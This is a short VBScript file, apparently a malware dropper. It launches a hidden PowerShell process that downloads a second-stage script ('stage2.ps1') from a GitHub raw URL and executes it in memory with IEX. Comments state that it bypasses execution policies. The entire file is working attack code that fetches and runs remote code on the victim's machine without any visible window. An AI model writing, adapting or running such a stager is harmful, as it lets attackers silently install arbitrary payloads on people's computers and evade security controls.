' Create a shell object to run commands
Set objShell = CreateObject("WScript.Shell")
' Command to download and execute the PowerShell stager in memory, hidden.
' This bypasses execution policies.
strCommand = "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/lucid251/HGJFJTKH24/main/stage2.ps1'))"""
' Execute the command
objShell.Run strCommand, 0, False
